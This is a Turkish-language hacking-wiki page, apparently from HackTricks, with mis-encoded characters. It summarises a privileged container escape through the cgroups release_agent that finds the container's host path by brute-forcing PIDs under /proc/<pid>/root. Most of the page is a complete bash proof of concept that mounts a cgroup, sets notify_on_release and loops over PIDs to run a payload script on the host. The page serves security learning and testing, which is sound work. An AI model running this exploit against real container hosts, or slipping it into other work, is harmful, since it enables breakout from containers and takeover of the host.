{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

Daha fazla ayrÄ±ntÄ± iÃ§in **[https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)** blog gÃ¶nderisini kontrol edin. Bu sadece bir Ã¶zet:

Teknik, **bir konteyner iÃ§inden ana makine kodunu Ã§alÄ±ÅŸtÄ±rma** yÃ¶ntemini Ã¶zetlemektedir ve Kata Containers veya belirli `devicemapper` ayarlarÄ± gibi konteynerin dosya sistemi yolunu ana makinede gizleyen depolama sÃ¼rÃ¼cÃ¼sÃ¼ yapÄ±landÄ±rmalarÄ±nÄ±n getirdiÄŸi zorluklarÄ± aÅŸmaktadÄ±r.

Ana adÄ±mlar:

1. **Ä°ÅŸlem Kimliklerini (PID) Bulma:** Linux sahte dosya sistemindeki `/proc/<pid>/root` sembolik baÄŸlantÄ±sÄ±nÄ± kullanarak, konteyner iÃ§indeki herhangi bir dosyaya ana makinenin dosya sistemi ile ilgili olarak eriÅŸilebilir. Bu, konteynerin dosya sistemi yolunu ana makinede bilme gereÄŸini ortadan kaldÄ±rÄ±r.
2. **PID KÄ±rma:** Ana makinedeki PID'leri aramak iÃ§in bir kaba kuvvet yaklaÅŸÄ±mÄ± kullanÄ±lÄ±r. Bu, `/proc/<pid>/root/<file>` yolunda belirli bir dosyanÄ±n varlÄ±ÄŸÄ±nÄ± sÄ±rayla kontrol ederek yapÄ±lÄ±r. Dosya bulunduÄŸunda, ilgili PID'nin hedef konteyner iÃ§inde Ã§alÄ±ÅŸan bir iÅŸleme ait olduÄŸunu gÃ¶sterir.
3. **Ã‡alÄ±ÅŸtÄ±rmayÄ± Tetikleme:** Tahmin edilen PID yolu `cgroups release_agent` dosyasÄ±na yazÄ±lÄ±r. Bu iÅŸlem, `release_agent`'in Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± tetikler. Bu adÄ±mÄ±n baÅŸarÄ±sÄ±, bir Ã§Ä±ktÄ± dosyasÄ±nÄ±n oluÅŸturulup oluÅŸturulmadÄ±ÄŸÄ±nÄ± kontrol ederek doÄŸrulanÄ±r.

### SÃ¶mÃ¼rÃ¼ SÃ¼reci

SÃ¶mÃ¼rÃ¼ sÃ¼reci, konteyner iÃ§inde Ã§alÄ±ÅŸan bir iÅŸlemin doÄŸru PID'sini tahmin ederek ana makinede bir yÃ¼k Ã§alÄ±ÅŸtÄ±rmayÄ± amaÃ§layan daha ayrÄ±ntÄ±lÄ± bir eylem setini iÃ§erir. Ä°ÅŸte nasÄ±l geliÅŸir:

1. **OrtamÄ± BaÅŸlat:** Ana makinede bir yÃ¼k betiÄŸi (`payload.sh`) hazÄ±rlanÄ±r ve cgroup manipÃ¼lasyonu iÃ§in benzersiz bir dizin oluÅŸturulur.
2. **YÃ¼kÃ¼ HazÄ±rla:** Ana makinede Ã§alÄ±ÅŸtÄ±rÄ±lacak komutlarÄ± iÃ§eren yÃ¼k betiÄŸi yazÄ±lÄ±r ve Ã§alÄ±ÅŸtÄ±rÄ±labilir hale getirilir.
3. **Cgroup'u Kur:** Cgroup monte edilir ve yapÄ±landÄ±rÄ±lÄ±r. YÃ¼kÃ¼n cgroup serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± saÄŸlamak iÃ§in `notify_on_release` bayraÄŸÄ± ayarlanÄ±r.
4. **PID'yi Kaba Kuvvetle KÄ±r:** Bir dÃ¶ngÃ¼, potansiyel PID'ler arasÄ±nda dÃ¶ner ve her tahmin edilen PID'yi `release_agent` dosyasÄ±na yazar. Bu, yÃ¼k betiÄŸini `release_agent` olarak ayarlar.
5. **Ã‡alÄ±ÅŸtÄ±rmayÄ± Tetikle ve Kontrol Et:** Her PID iÃ§in, cgroup'un `cgroup.procs` dosyasÄ±na yazÄ±lÄ±r, eÄŸer PID doÄŸruysa `release_agent`'in Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± tetikler. DÃ¶ngÃ¼, yÃ¼k betiÄŸinin Ã§Ä±ktÄ±sÄ± bulunana kadar devam eder, bu da baÅŸarÄ±lÄ± bir Ã§alÄ±ÅŸtÄ±rmayÄ± gÃ¶sterir.

Blog gÃ¶nderisinden PoC:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
</details>
{% endhint %}
